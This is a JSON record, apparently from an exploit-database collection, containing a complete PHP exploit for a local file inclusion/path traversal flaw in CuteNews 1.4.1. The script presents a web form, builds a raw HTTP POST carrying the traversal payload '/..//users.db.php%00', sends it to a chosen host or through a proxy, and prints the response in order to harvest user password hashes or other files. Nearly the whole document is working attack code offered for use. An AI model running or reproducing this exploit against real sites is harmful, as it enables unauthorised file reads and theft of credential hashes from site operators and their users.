{
  "id": "1612",
  "title": "CuteNews 1.4.1 - &#039;function.php&#039; Local File Inclusion",
  "cve": null,
  "vuln_type": "path_traversal",
  "code": "<?php\r\n// Happy NEW Iranian year .\r\n// Happy Norouz  ( PERSIAN celebration )\r\n// CuteNews 1.4.1 (CutePHP.com) Hash password Finder\r\n// by Hamid Ebadi\r\n// http://hamid.ir\r\n// Bug Discovered and Exploited by Hamid Ebadi .: Hamid Network Security Team :.\r\n// run it from your browser...\r\n// make these changes in php.ini if you have troubles with this script\r\n\r\n//allow_call_time_pass_reference = on\r\n//register_globals = On\r\n\r\nerror_reporting(0);\r\necho '<head><title>CuteNews 1.4.1 user Hash password Finder</title>\r\n      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n      <style type=\"text/css\">\r\n      <!--\r\n      body,td,th {color: #000000;}\r\n      body {background-color:EBEBEB #;}\r\n      .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }\r\n      .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 12px;\r\n        font-weight: bold;\r\n\r\n              }\r\n      -->\r\n      </style></head>\r\n      <body>\r\n<h2>CuteNews 1.4.1 (and Below) user Hash password Finder </h2>\r\n <p class=\"Stile6\">Security ? . </p>\r\n <p class=\"Stile6\">Bug Discovered and Exploited by Hamid Ebadi  <a href=\"http://www.hamid.ir\" target=\"_blank\">.: Hamid Network Security Team :.</a></p>\r\n<p class=\"Stile5\">Happy Norouz  ( PERSIAN new year celebration ) Greetz to all Iranian Hackers spacially my friends in ihsteam.com  c0d3r.org  kapda.ir simorgh-ev.com hat-squad.com  blacknews.ws ashiyane.com websecurity.ir crouz.com shabgard.org hackerz.ir  and ...</p>\r\n\r\n\r\n\r\n<p class=\"Stile6\">read this paper about <a href=\"http://www.hamid.ir/security/\" target=\"_blank\">CuteNews 1.4.1   vulnerability</a></p>\r\n<table width=\"84%\" >\r\n  <tr>\r\n    <td width=\"43%\">\r\n     <form name=\"form1\" method=\"post\" action=\"'.$PHP_SELF.'?path=value&host=value&\". \"port=value&command=value&proxy=value\">\r\n      <p>\r\n       <input type=\"text\" name=\"host\">\r\n      <span class=\"Stile5\">hostname (ex: www.sitename.com) </span></p>\r\n      <p>\r\n        <input type=\"text\" name=\"path\">\r\n        <span class=\"Stile5\">path (ex: /cutenews/example2.php ) </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"port\">\r\n        <span class=\"Stile5\">specify a port other than 80 (default value) </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"proxy\">\r\n        <span class=\"Stile5\">send exploit through an HTTP proxy (ip:port) </span></p>\r\n      <p>\r\n      <input type=\"text\" name=\"command\">\r\n        <span class=\"Stile5\">specify a file  other than /../users.db.php%00 to read  </span></p>\r\n      <p>\r\n          <input type=\"submit\" name=\"Submit\" value=\"go!\">\r\n      </p>\r\n<p class=\"Stile5\">Spacial THX : rgod at <a href=\"http://rgod.altervista.org\" target=\"_blank\">http://rgod.altervista.org</a> for his great codes (i just change few lines of RGOD old NETQUERY remote commands execution exploit)</p>\r\n    </form></td>\r\n  </tr>\r\n</table>\r\n</body>\r\n</html>';\r\n\r\nfunction show($headeri)\r\n{\r\n$host=$_POST[host];\r\n$path=$_POST[path];\r\n$port=$_POST[port];\r\n$proxy=$_POST[proxy];\r\n$command=$_POST[command];\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>  </td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n       }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>  </td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n       }\r\n\r\necho \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nif ( ($host<>''))\r\n{\r\nif ($port=='') {$port=80;}\r\nif ($path=='') {$path=\"example2.php\";}\r\n\r\nif ($command=='') {$command=\"/..//users.db.php%00\";}\r\n$data=\"archive=\".$command;\r\nif ($proxy=='')\r\n       {$packet=\"POST \".$path.\"  HTTP/1.1\\r\\n\";}\r\nelse\r\n       {\r\n        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);\r\n        if ($c==0) {\r\n                    echo 'check the proxy...<br>';\r\n             die;\r\n            }\r\n         else\r\n        {$packet=\"POST http://\".$host.$path.\" HTTP/1.1\\r\\n\";}\r\n        }\r\n\r\n$packet.=\"Accept: */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1) Hamid/2006\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\n\r\necho '<br> Sending exploit to '.$host.'<br>';\r\n\r\nif ($proxy=='')\r\n           {$fp=fsockopen(gethostbyname($host),$port);}\r\n           else\r\n           {$parts=explode(':',$proxy);\r\n     echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n     $fp=fsockopen($parts[0],$parts[1]);\r\n     if (!$fp) { echo 'No response from proxy...';\r\n   die;\r\n         }\r\n\r\n     }\r\necho $packet ;\r\nshow($packet);\r\nfputs($fp,$packet);\r\n\r\nif ($proxy=='')\r\n{ $data='';\r\n     while (!feof($fp))\r\n     {\r\n      $data.=fgets($fp);\r\n     }\r\n}\r\nelse\r\n{\r\n$data='';\r\n   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))\r\n   {\r\n      $data.=fread($fp,1);\r\n   }\r\n\r\n}\r\nfclose($fp);\r\nif (eregi('HTTP/1.1 200 OK',$data))\r\n    {echo 'Exploit sent...<br> If CuteNews 1.4.1   is unpatched and vulnerable  <br>';\r\n     echo 'you will see '.htmlentities($command).' output inside HTML...<br><br>';\r\n    }\r\nelse\r\n    {echo 'Error, see output...';}\r\n\r\n//show($data); //debug: show output in a packet dump...\r\n//echo nl2br(htmlentities($data));\r\necho $data;\r\n}\r\n?> \r\n\r\n# milw0rm.com [2006-03-26]",
  "url": "https://www.exploit-db.com/exploits/1612"
}